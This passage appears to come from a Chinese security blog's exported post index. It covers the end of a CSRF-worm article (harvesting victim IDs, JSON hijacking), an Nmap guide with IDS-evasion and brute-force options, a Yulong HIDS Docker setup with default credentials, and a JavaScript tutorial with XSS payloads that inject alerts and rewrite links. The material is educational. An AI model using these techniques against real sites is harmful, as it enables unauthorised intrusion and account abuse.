受害者的标识信息，如用户id等，经常出现在url中，这样我们就可以利用服务端脚本来获取请求的Referer中的用户id，以此为基础构造出html+js的攻击页面，在攻击向量中添加我们服务端脚本的链接，以此造成蠕虫传播的效果。 方法二：利用JSON HiJacking技术获取 JSON HiJacking的攻击方法前面已经讲得很详细了，如果网站上提供了这样的获取数据的接口，那么利用这种技术获取用户的隐私信息是一个不错的方法。 综上所述，如果一个SNS网站上存在CSRF漏洞，并且我们有办法获取到用户的标识信息，那么就满足了CSRF蠕虫传播的条件，这个网站就是可蠕虫的。 0x08 参考文献https://wooyun.kieran.top/#!/drops/1189.%E9%82%AA%E6%81%B6%E7%9A%84CSRF]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap的基本使用]]></title>
    <url>%2F2018%2F08%2F25%2FNmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。 Nmap工作原理TCP/IP协议栈指纹准确地判断目标主机的操作系统类型。 Nmap特色灵活、功能强大、便捷式、简单、免费、记录完整、支持、备受赞誉、流行 Nmap典型用途：1、通过对设备或者防火墙的探测来审计它的安全性。 2、探测目标主机所开放的端口。 3、网络存储，网络映射，维护和资产管理。 4、通过识别新的服务器审计网络的安全性。 5、探测网络上的主机 Nmap扫描命令解释使用IP地址扫描nmap 192.168.3.14 命令使用了“-v”选项，此选项个给了更多的远程设备的细节。（-vv结果一样） 扫描多个主机扫描多个主机只需要简单地以空格隔开输入他们IP地址或者主机名即可 -p指定扫描的端口范围nmap -p（22,80,445）ip nmap -p 1-100 ip nmap -sP ip -sP 设置扫描方式为ping扫描 nmap -sP 192.168.199.138/24 路由跟踪扫描nmap –traceroute ip –traceroute 记录本机到目标主机的网络节点。 Nmap操作系统探测使用选项“-O”和“-osscan-guess”帮助尝试探测操作系统信息。 -sV端口服务版本检测 nmap -O -sV 192.168.199.138 -A 综合扫描 -A综合扫描，包括系统探测，版本探测，脚本扫描，路由跟踪 探测在远程主机的操作系统以及版本信息。为了可以探测操作系统和版本，脚本扫描和路由追踪 -P0 无ping扫描 -Pn 禁ping扫描 使用“iL”选项的nmap命令去扫描所有在文件列出的IP地址。 -sL 列表扫描 -n 禁止DNS反向解析 -R 反向域名解析 nmap -R -sL *.192.168.199.138/24 -sS 半连接扫描 使用Zenmap进行扫描 Nmap提供了 6个端口状态，帮助我们了解目标。第一种状态：Open （开放） 第二种状态：Closed （关闭） 第三种状态：Filtered （过滤） 第四种状态：Unfiltered （未过滤） 第五种状态：Open|Filtered （开放或过滤） 第六种状态：Closed|Filtered （关闭或过滤） Nmap参数解释：用法nmap [扫描类型] [选项] {目标规格} 目标规格 可以通过主机名，IP地址，网络等 例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254 -iL : 从主机/网络列表中输入 -iR : 选择随机目标 –exclude &lt;host1[,host2][,host3],…&gt;: 排除主机/网络 –excludefile &lt;exclude_file&gt;: 从文件中排除列表 主机发现 -sL: 列表扫描 - 只需列出要扫描的目标 -sn: Ping扫描 - 禁用端口扫描 -Pn: 将所有主机视为联机 - 跳过主机发现 -PS/PA/PU/PY[portlist]: 对给定端口的TCP SYN / ACK，UDP或SCTP发现 -PE/PP/PM: ICMP回显，时间戳和网络掩码请求发现探测 -PO[protocol list]: IP协议Ping -n/-R: 永远不要做DNS解析 –dns-servers &lt;serv1[,serv2],…&gt;: 指定自定义DNS服务器 –system-dns: 使用操作系统的DNS解析器 –traceroute: 跟踪每个主机的跳转路径 扫描技术 -sS/sT/sA/sW/sM: TCP SYN / 连接（）/ ACK / Window / 过时的Maimon扫描 -sU: UDP扫描 -sN/sF/sX: TCP空，FIN和圣诞节扫描 –scanflags : 自定义TCP扫描标志 -sI ：空闲扫描 -sY/sZ: SCTP INIT / COOKIE-ECHO扫描 -sO: IP协议扫描 -b : FTP反弹扫描端口规格和扫描订单 -p : 仅扫描指定的端口 例如: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 –exclude-ports : 从扫描中排除指定的端口 -F: 快速模式 - 扫描比默认扫描更少的端口 -r: 连续扫描端口 - 不要随机化 –top-ports : 扫描最常见的端口 –port-ratio : 扫描端口比&lt;比率&gt;更普遍 服务/版本检测 -sV: 探测打开的端口以确定服务/版本信息 –version-intensity : 从0（亮）到9（尝试所有探针） –version-light: 限制为最有可能的探针（强度2） –version-all: 尝试每一个探针（强度9） –version-trace: 显示详细版本的扫描活动（用于调试） 脚本扫描 -sC: 等同于–script = default –script=: directories, script-files or script-categories: –script-args=&lt;n1=v1,[n2=v2,…]&gt;: 为脚本提供参数 –script-args-file=filename: 在文件中提供NSE脚本参数 –script-trace: 显示所有发送和接收的数据 –script-updatedb: 更新脚本数据库。 –script-help=: 显示有关脚本的帮助。 &lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories –script=auth:可以对主机或目标主机所在的网段进行应用弱口令检测 –script=brute：Nmap具有暴力破解的功能，可对数据库、SMB、SNMP等进行简单密码的暴力猜测。 –script=vulin：可以检查目标主机或网段是否存在常见的漏洞 –script=realvnc：应用服务扫描脚本，VNC服务。 操作系统检测 -O: 启用操作系统检测 –osscan-limit: 限制操作系统检测到有前景的目标 –osscan-guess: 猜测操作系统更积极 时间和表现 Options which take are in seconds, or append ‘ms’ (milliseconds),: ‘s’ (seconds), ‘m’ (minutes), or ‘h’ (hours) to the value (e.g. 30m).: -T: 设定时间模板（越快越快） –min-hostgroup/max-hostgroup : 并行主机扫描组大小 –min-parallelism/max-parallelism : 探测器并行化 –min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : 指定探测往返时间。 –max-retries : 端口扫描探测重传次数的上限。 –host-timeout : 在此之后放弃目标 –scan-delay/–max-scan-delay : 调整探头之间的延迟 –min-rate : 发送不低于每秒的数据包 –max-rate : 发送数据包不会比每秒更快 防火墙/IDS躲避和防护 -f; –mtu : 分段数据包（可选w /给定MTU） -D &lt;decoy1,decoy2[,ME],…&gt;: 用诱饵隐形扫描 -S &lt;IP_Address&gt;: 欺骗源地址 -e : 使用指定的接口 -g/–source-port : 使用给定的端口号 –proxies &lt;url1,[url2],…&gt;: 通过HTTP / SOCKS4代理中继连接 –data : 附加一个自定义的有效载荷到发送的数据包 –data-string : 附加一个自定义的ASCII字符串到发送的数据包 –data-length : 追加随机数据到发送的数据包 –ip-options : 发送指定ip选项的数据包 –ttl : 设置IP生存时间字段 –spoof-mac &lt;mac address/prefix/vendor name&gt;: 欺骗您的MAC地址 –badsum: 发送具有伪造的TCP / UDP / SCTP校验和的数据包 输出: -oN/-oX/-oS/-oG : 输出扫描正常，XML，s | &lt;rIpt kIddi3， and Grepable format, respectively, to the given filename.: -oA : 一次输出三种主要格式 -v: 提高详细程度（使用-vv或更多来获得更大的效果） -d: 增加调试级别（使用-dd或更多以获得更好的效果） –reason: 显示端口处于特定状态的原因 –open: 只显示打开（或可能打开）的端口 –packet-trace: 显示所有发送和接收的数据包 –iflist: 打印主机接口和路由（用于调试） –append-output: 附加到指定的输出文件而不是clobber –resume : 恢复中止的扫描 –stylesheet &lt;path/URL&gt;: 将XML输出转换为HTML的XSL样式表 –webxml: Nmap.Org的参考样式表，以获得更多可移植的XML –no-stylesheet: 阻止与XML输出相关联的XSL样式表 MISC:-6: 启用IPv6扫描 -A: 启用操作系统检测，版本检测，脚本扫描和跟踪路由 –datadir : 指定自定义Nmap数据文件的位置 –send-eth/–send-ip: 使用原始以太网帧或IP数据包进行发送 –privileged: 假设用户是完全特权的 –unprivileged: 假设用户缺少原始套接字权限 -V: 打印版本号 -h: 打印此帮助摘要页面。 例子 nmap -v -A scanme.nmap.org: nmap -v -sn 192.168.0.0/16 10.0.0.0/8: nmap -v -iR 10000 -Pn -p 80 从test.txt列表中批量扫描后把结果输出result1.txt中 nmap -vv -P0 -iL ‘/root/Desktop/test.txt’ -oN ‘/root/Desktop/result1.txt’. 参考文献：Nmap中文说明：http://www.nmap.com.cn/doc/manual.shtm#7 https://blog.csdn.net/redmoon729/article/details/53282947]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
        <tag>端口扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker快速部署驭龙HIDS]]></title>
    <url>%2F2018%2F08%2F24%2FDocker%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E9%A9%AD%E9%BE%99HIDS%2F</url>
    <content type="text"><![CDATA[0x01 前言驭龙HIDS是一款由 YSRC 开源的入侵检测系统，由Agent,Daemon,Server 和Web四个部分组成，集异常检测、监控管理为一体，拥有异常行为发现、快速阻断、高级分析等功能，可从多个维度行为信息中发现入侵行为。 Agent为采集者角色，收集服务器信息、开机启动项、计划任务、监听端口、服务、登录日志、用户列表，实时监控文件操作行为、网络连接、执行命令，初步筛选整理后通过RPC协议传输到Server节点。 Daemon为守护服务进程，为Agent提供进程守护、静默环境部署作用，其任务执行功能通过接收服务端的指令实现Agent热更新、阻断功能和自定义命令执行等，任务传输过程使用RSA进行加密。 Server为整套系统的大脑，支持横向扩展分布式部署，解析用户定义的规则（已内置部分基础规则）对从各Agent接收到的信息和行为进行分析检测和保存，可从各个维度的信息中发现webshell写入行为、异常登录行为、异常网络连接行为、异常命令调用行为等，从而实现对入侵行为实时预警。 0x02 功能特点 实时监控、秒级响应 全局首次出现概念，可发现未知威胁 支持自定义规则，高扩展性 高级分析功能，可溯源 全局快速阻断（进程、文件） 威胁情报查询（可自定义接口） 0x03 整体架构图Agent为采集者角色，收集服务器信息、开机启动项、计划任务、监听端口、服务、登录日志、用户列表，实时监控文件操作行为、网络连接、执行命令，初步筛选整理后通过RPC协议传输到Server节点。 Daemon为守护服务进程，为Agent提供进程守护、静默环境部署作用，其任务执行功能通过接收服务端的指令实现Agent热更新、阻断功能和自定义命令执行等，任务传输过程使用RSA进行加密。 Server为整套系统的大脑，支持横向扩展分布式部署，解析用户定义的规则（已内置部分基础规则）对从各Agent接收到的信息和行为进行分析检测和保存，可从各个维度的信息中发现webshell写入行为、异常登录行为、异常网络连接行为、异常命令调用行为等，从而实现对入侵行为实时预警。 架构图 0x04 TODO 建立入侵行为case库，自动化重放case模拟测试 机器学习判断可疑行为，作为规则之外的补充 资产盘点，例如识别补丁，应用版本、负责人，各种包/kernel版本… 辅以漏洞库，能更快速的应急响应，哪些必须要修，那些不修可以接受 区分通讯模式（主动、被动） 使用消息队列代替RPC 基线核查，没有代码能力的社区成员也可以整理好相关文档，YSRC来实现 幻影蜜罐，agent动态代理蜜罐端口，大规模提升蜜罐覆盖密度 支持多场景（办公环境、Docker），目前驭龙仅适合线上服务器环境 轻量级的linux内核防护，在不升级内核的情况下，免疫一些攻击 0x05 Docker快速安装Docker 版只为快速体验使用，请不要在生产环境下使用! 该版本中只包括了服务端：Server、Web、ElasticSearch和MongoDB, Client 端的 Agent 和 Daemon 请在相应的机器中运行即可. 依赖 docker-ce &gt;= 18 # docker的版本需要大于等于18.0 docker-compose &gt;= 1.20 #docker-compose的版本需要大于等于1.2 安装docker-compose：https://docs.docker.com/compose/install/#install-compose 安装docker-ce：&lt;https://my.oschina.net/shyloveliyi/blog/1616025&gt; 使用步骤Step1. 下载源码1$ git clone https://github.com/ysrc/yulong-hids.git Step2. 初次编译并运行1$ cd yulong-hids/ $ docker-compose up 由于需要映射 Web 80/443 端口到宿主机80/443端口，请保证有权限，如果提示 Permission denied, 请执行 sudo docker-compose up 第一次启动时由于 Server 需要配置文件不存在会导致启动失败，不要慌，只要保证 web、mongo、es 正常启动即可 如果提示获取 docker image 失败，请检查网络并重试，或者给 docker pull 挂上 http/https 代理 centos7 安装使用proxychains4： https://jingyan.baidu.com/album/148a1921f5c5fe4d71c3b105.html?picindex=10 Step3.通过 Web 界面初始化假定宿主机（物理机）的 IP 地址是: 192.168.3.43 打开浏览器访问http://192.168.3.43如果启动正常，就可以看到驭龙的Login界面了，输入下面的登录名和密码进入后台。 默认登录账号：yulong 密码：All_life_is_a_game_of_luck. 后面有一个点 Web安装向导指南：https://github.com/ysrc/yulong-hids/blob/master/docs/guide.md 初始化的第3步所需要上传的文件需前往Release发布页下载发行版 zip 包，并解压，然后上传对应的 win-32.zip,win-64.zip,linux-64.zip即可。 Step4.重新启动通过 Web 初始化完毕后，切回 docker-compose up 的终端，按下 Ctrl + C 组合键，结束进程，然后执行：1$ docker-compose up -d 浏览器打开 http://192.168.3.43就可以看到正常功能的界面了. Step5.启动Server调校程序下载Adapter：https://sec.ly.com/mirror/yulong_server_docker_adapter_linux_amd64.zip 另起一个会话窗口：1234rz #本地下载的Adapterunzip yulong_server_docker_adapter_linux_amd64.zipchmod +x yulong_server_docker_adapter_linux_amd64./yulong_server_docker_adapter_linux_amd64 这个程序要一直运行着… 0x06 参考文献：https://github.com/ysrc/yulong-hidshttps://github.com/ysrc/yulong-hids/blob/master/docs/docker.mdhttps://github.com/ysrc/yulong-hids/blob/master/docs/guide.mdhttps://www.secpulse.com/archives/70190.html]]></content>
      <categories>
        <category>搭建服务</category>
      </categories>
      <tags>
        <tag>IDS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript脚本语言学习分享]]></title>
    <url>%2F2018%2F08%2F23%2FJavaScript%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[【前言】JavaScript是脚本语言，又称为动态语言，是一种编程语言，用来控制软件应用程序，通常以文本保存，只在调用时调用进行编译。JavaScript 是可插入 HTML 页面的编程代码JavaScript 插入 HTML 页面后，可由所有的现代浏览器执行 JavaScript实现： HTML 中的脚本必须位于 与 标签之间。 脚本可被放置在 HTML 页面的 和 部分中。 HTML常用标签a标签 用来实现超链接 href 属性规定链接的目标 开始标签和结束标签之间的文字被作为超级链接来显示 例：1&lt;a href=&quot;http://www.gooann.com&quot;&gt;点击我跳转&lt;/a&gt; 点击后跳转到www.gooann.com的页面 P标签 定义一个段落 浏览器会自动地在段落的前后添加空行 例：12&lt;p&gt;我是一个段落&lt;/p&gt; &lt;/br&gt; 换行 h标签1234过 &lt;h1&gt; - &lt;h6&gt; 等标签进行定义的&lt;h1&gt; 定义最大的标题&lt;h6&gt; 定义最小的标题浏览器会自动地在段落的前后添加空行例： &lt;h1&gt;我是标题1&lt;/h1&gt; div标签 标签定义文档中的区域块 例：1&lt;div &gt;我是一个区域块&lt;/div&gt; button标签 标签定义一个按钮 例： 1&lt;button type=“button”&gt;我是一个按钮&lt;/button&gt; 表格（table、tr、th、td） 简单的 HTML 表格由 table 元素以及一个或多个 tr、th 或 td 元素组成 tr 元素定义表格行，th 元素定义表头，td 元素定义表格单元 例：1234&lt;table&gt; ​ &lt;tr&gt; &lt;th&gt; &lt;/th&gt;&lt;th&gt; &lt;/th&gt;&lt;/tr&gt;​ &lt;tr&gt; &lt;td&gt; &lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; input标签 根据不同的 type 属性值，输入字段拥有很多种形式 （text（文本）、button（按钮）、checkbox（勾选）、file（选文件）、hidden（）、password、radio（圆点勾选） 例：1&lt;input type=&quot;text&quot; /&gt; HTML常用style属性用Style来定义标签元素的字体颜色、背景色、高度宽度等属性。 color：字体颜色 background：背景色 width、height：宽度、高度 JavaScript获取元素的方法通过id获得（document.getElementById） 通过标签获得（document.getElementsByTagName） 通过类名获得（document.getElementsByClassName ） JavaScript修改HTML改变 HTML 元素内容（innerHTML、input标签的value） 改变 HTML 元素样式（style.color） 改变 HTML 元素属性（如src） JavaScript事件响应1、鼠标点击事件onclick1234567891）onclick=&quot;this.innerHTML=&apos;谢谢!&apos;&quot;2）document.getElementById(id).onclick=function()&#123;alert(&apos;谢谢’)&#125;; &lt;script&gt;中添加3）&lt;h1 id=&quot;h1&quot; onclick=“change(this)&quot;&gt;请点击该文本&lt;/h1&gt;&lt;script&gt; function change(elment)&#123; elment.innerHTML=&quot;谢谢&quot;; &#125;&lt;/script&gt;4) onclick=&quot;javascript:document.getElementById(&apos;h1&apos;).innerHTML=&apos;谢谢&apos;&quot; 2.鼠标移入移出鼠标移入（onmouseover） 鼠标移出（onmouseout） 例题：1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;div onmouseover=&quot;mOver(this)&quot; onmouseout=&quot;mOut(this)&quot; style=&quot;background-color:green;width:120px;height:20px;padding:40px;text-align:center;color:#ffffff;&quot;&gt;便利店&lt;/div&gt;&lt;script&gt; function mOver(obj)&#123;​ obj.innerHTML=&quot;欢迎光临&quot;; &#125; function mOut(obj)&#123;​ obj.innerHTML=&quot;再见&quot;;​ setTimeout(function()&#123;obj.innerHTML=&quot;便利店&quot;&#125;,1000); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 3.鼠标左键按下和放开鼠标左键按下（onmousedown） 鼠标左键放开（onmouseup） . 例题：123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;div onmousedown=&quot;mDown(this)&quot; onmouseup=&quot;mUp(this)&quot; style=&quot;background-color:green;color:#ffffff;width:90px;height:20px;padding:40px;font-size:12px;&quot;&gt;请点击这里&lt;/div&gt;&lt;script&gt; function mDown(obj)&#123;​ obj.style.backgroundColor=&quot;#1ec5e5&quot;;​ obj.innerHTML=&quot;请释放鼠标按钮&quot; &#125; function mUp(obj)&#123;​ obj.style.backgroundColor=&quot;green&quot;;​ obj.innerHTML=&quot;请按下鼠标按钮&quot; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4、获得焦点和失去焦点获得焦点（onfocus） 失去焦点（onblur） 例题：123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;输入框1：&lt;input type=&quot;text&quot; onfocus=&quot;Mfocus(this)&quot; onblur=&quot;Mblur(this)&quot;&gt;&lt;br&gt;输入框2：&lt;input type=&quot;text&quot; onfocus=&quot;Mfocus(this)&quot; onblur=&quot;Mblur(this)&quot;&gt;&lt;script&gt; function Mfocus(obj)&#123;​ obj.style.background=&quot;yellow&quot;; &#125; function Mblur(obj)&#123;​ obj.style.background=&quot;white&quot;; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 5、加载文档或图片响应onerror 例题：123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;img src=&quot;./images/pic_bulboff.gif&quot; onerror=&quot;message()&quot;&gt;&lt;script&gt; function message()&#123;​ alert(&quot;未找到资源&quot;); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript添加元素1、添加元素的步骤创建元素（document.createElement） 创建元素文本（document.createTextNode） 向创建的元素追加文本（ appendChild ） 将追加好文本的元素添加到已知元素（父元素）（ appendChild ） 例题：123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div id=&quot;div&quot; style=&quot;color:red;background:yellow;width:200px&quot;&gt;​ &lt;h3&gt;我是一个标题3&lt;/h3&gt;​ &lt;p&gt;我是一个段落&lt;/p&gt; &lt;/div&gt; &lt;button onclick=&quot;add()&quot;&gt;添加元素&lt;/button&gt;&lt;script&gt;function add()&#123;​ var nobj = document.createElement(&quot;p&quot;);​ var node = document.createTextNode(&quot;我是新的段落&quot;); nobj.appendChild(node);​ document.getElementById(&quot;div&quot;).appendChild(nobj);&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript删除元素2、删除元素的步骤找到要删除元素的父元素（document.getElementById(父元素id)） 找到要删除的元素（document.getElementById(子元素id)） 从父元素删除子元素（ 父元素.removeChild(子元素) ） 例题：1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div id=&quot;div&quot; style=&quot;color:red;background:yellow;width:200px&quot;&gt;​ &lt;h3 id=&quot;h&quot;&gt;我是一个标题3&lt;/h3&gt;​ &lt;p id=&quot;p&quot;&gt;我是一个段落&lt;/p&gt; &lt;/div&gt; &lt;button onclick=&quot;del()&quot;&gt;删除元素&lt;/button&gt;&lt;script&gt;function del()&#123;​ var par = document.getElementById(&quot;div&quot;);​ var chi = document.getElementById(&quot;h&quot;);​ par.removeChild(chi);&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript基本语法 用var来进行变量声明 字符：var name=”Bill Gates”; var name=”Bill”+” Gates”; 数值：var x=5; var x=2+3; 日期：var myDate=new Date() ; ①var mycars=new Array(); mycars[0]=”BMW”; mycars[1]=“Audi”; mycars[2]=”Benz”; ②var mycars=new Array(“BMW”, “Audi”, “Benz”); 例题：12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;显示&lt;/button&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var name=&quot;Bill&quot;+&quot; Gates&quot;; ​ var x=2+3;​ var myDate=new Date();​ var mycars=new Array();​ mycars[0]=&quot;BMW&quot;; mycars[1]=&quot;Audi&quot;; mycars[2]=&quot;Benz&quot;;​ var mycars2=new Array(&quot;BMW&quot;, &quot;Audi&quot;, &quot;Benz&quot;);​ alert(name);​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 2 . If 语句if(条件){代码} if(条件){代码}else{代码} if(条件){代码}else if(条件){代码}else{代码} 例题：1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ text:&lt;input id=&quot;in&quot; type=&quot;text&quot; /&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;奇偶判断&lt;/button&gt;​ &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;p/&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var val = document.getElementById(&quot;in&quot;).value;​ if(val === &quot;&quot; || val == null)&#123;​ document.getElementById(&quot;p&quot;).innerHTML = &quot;输入为空&quot;;​ &#125;else if(isNaN(val))&#123;​ document.getElementById(&quot;p&quot;).innerHTML = &quot;输入不是数字&quot;;​ &#125;else&#123;​ if(val%2 == 0)&#123; ​ document.getElementById(&quot;p&quot;).innerHTML = val+&quot;是偶数&quot;;​ &#125;else&#123; ​ document.getElementById(&quot;p&quot;).innerHTML = val+&quot;是奇数&quot;;​ &#125; ​ &#125;​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 3 . Switch 语句12345678switch(n) &#123; case 1: 执行代码块 1​ break;​ case 2: 执行代码块 2​ break;​ default:​ 都不满足时执行的代码​ &#125; 例题：12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ text:&lt;input id=&quot;in&quot; type=&quot;date&quot; /&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;判断周末&lt;/button&gt;​ &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;p/&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var x = &quot;&quot;;​ var text = document.getElementById(&quot;in&quot;).value;​ var day = new Date(text).getDay();​ switch (day)&#123;​ case 0:​ x = text+&quot;是周末&quot;;​ break;​ case 6:​ x = text+&quot;是周末&quot;;​ break;​ default:​ x = text+&quot;不是周末&quot;;​ &#125;​ document.getElementById(&quot;p&quot;).innerHTML = x;​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.for 循环（可以遍历元素）123456for (语句 1; 语句 2; 语句 3) &#123; 被执行的代码块 &#125; 语句1 在循环开始之前设置变量 (如：var i=0)。 语句2 定义循环运行的条件（如：i &lt; 5） 语句3 在每次代码块已被执行后增加一个值 (如：i++) 例题：123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ &lt;p&gt;我是第一段&lt;/p&gt;​ &lt;p&gt;我是第二段&lt;/p&gt;​ &lt;p&gt;我是第三段&lt;/p&gt;​ &lt;p&gt;我是第四段&lt;/p&gt;​ &lt;p&gt;我是第五段&lt;/p&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;改变&lt;/button&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var obj = document.getElementsByTagName(&quot;p&quot;);​ for (var i=0;i&lt;obj.length;i++)&#123;​ obj[i].innerHTML = &quot;我是第&quot;+(i+1)+&quot;段&quot;;​ &#125;​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 5 . while 循环123while (条件) &#123; 需要执行的代码 &#125; 例题：1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ &lt;p&gt;我是第一段&lt;/p&gt;​ &lt;p&gt;我是第二段&lt;/p&gt;​ &lt;p&gt;我是第三段&lt;/p&gt;​ &lt;p&gt;我是第四段&lt;/p&gt;​ &lt;p&gt;我是第五段&lt;/p&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;改变&lt;/button&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var obj = document.getElementsByTagName(&quot;p&quot;);​ var i = 0;​ while (i &lt; obj.length)&#123;​ obj[i].innerHTML = &quot;我是第&quot;+(i+1)+&quot;段&quot;;​ i++;​ &#125;​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript安全性XSS攻击路径： 2 . 下面这个页面注入一个弹出框12345678910 &lt;div&gt;​ text:&lt;input id=&quot;in&quot; type=&quot;text&quot; /&gt;&lt;button onclick=&quot;test()&quot;&gt;测试&lt;/button&gt;​ &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;/p&gt; &lt;/div&gt; &lt;script&gt;​ function test()&#123;​ var a = document.getElementById(&quot;in&quot;).value;​ document.getElementById(&quot;p&quot;).innerHTML = a;​ &#125; &lt;/script&gt; 如果我们在输入框中输入： ​ 你好alert(“1”) 会形成一个带弹出框的页面。 3 . 改变页面a标签的超链接1234567891011 &lt;div&gt;​ &lt;a id=&quot;a&quot; href=&quot;http://www.sina.com.cn&quot; target=&quot;_blank&quot;&gt;跳转到某门户网站&lt;/a&gt;​ &lt;br&gt;&lt;/&gt;text:&lt;input id=&quot;in&quot; type=&quot;text&quot; /&gt;&lt;button onclick=&quot;test()&quot;&gt;测试&lt;/button&gt;​ &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;/p&gt; &lt;/div&gt; &lt;script&gt;​ function test()&#123;​ var a = document.getElementById(&quot;in&quot;).value;​ document.getElementById(&quot;p&quot;).innerHTML = a;​ &#125;​ &lt;/script&gt; 如果我们在输入框中输入： ​ 你好document.getElementById(“a”).href = ​ “http://www.gooann.com&quot;;alert(&quot;我改变了链接&quot;) 会形成一个改变链接地址的页面。 产生问题的原因：带有HTML标签的输入被存储并反应到了页面上 解决方法：在使用用户输入、后台存储、以及页面反应时， ​ 使用函数去掉HTML标签或转义字符 JavaScript: textContent、encodeURIComponent() PHP: htmlspecialchars()、trim()、strip_tags()、addslashes() 5、JavaScript代码的安全性textContent ​ 不返回html文本，性能更好，安全性更高。返回纯文本，不带任何标签。 encodeURIComponent() ​ 对字符串替换所有非字母数字字符，安全性提高 6、PHP代码安全性htmlspecialchars() ​ 把“ （双引号）、‘ （单引号）、&lt; （小于）、&gt; （大于）等转化为实体 trim(string,charlist) ​ 去掉字符串两端预定义的字符，默认去掉 ​ “\0” (NULL) ​ “\t” (制表符) ​ “\n” (换行) ​ “\x0B” (垂直制表符) ​ “\r” (回车) ​ “ “ (空格) strip_tags() ​ 从字符串中去除 HTML 和 PHP 标记 addslashes(string) ​ 向字符串中的预定义字符添加反斜杠，默认 ​ 单引号（’） ​ 双引号（”） ​ 反斜杠（\） ​ NULL jQuery的介绍1、引入jQuery文件在head中引入jQuery文件 ​ 2、jQuery元素选择器id选择器：$(“#id”) 类选择器：$(“.class”) 元素选择器：$(“p”) ※获取内容：.text()、.html()、.val() ​ 设置内容： .text(内容)、.html(内容)、.val(内容) 例题：123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;script src=&quot;http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;p id=&quot;id1&quot; class=&quot;classp&quot;&gt;这是段落1&lt;/p&gt; &lt;p id=&quot;id2&quot; class=&quot;classp&quot;&gt;这是段落2&lt;/p&gt; &lt;p id=&quot;id3&quot; class=&quot;classp&quot;&gt;这是段落3&lt;/p&gt; &lt;p id=&quot;id4&quot; class=&quot;classp&quot;&gt;这是段落4&lt;/p&gt; &lt;p id=&quot;id5&quot; class=&quot;classp&quot;&gt;这是段落5&lt;/p&gt; &lt;input type=&quot;text&quot; class=&quot;classin&quot;/&gt; &lt;button onclick=&quot;test()&quot; &gt;button&lt;/button&gt;&lt;script&gt; function test()&#123; alert($(&quot;#id2&quot;).text()); $(&quot;p&quot;).each(function()&#123;​ alert($(this).text()) &#125;); alert($(&quot;.classin&quot;).val()); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL语句实操]]></title>
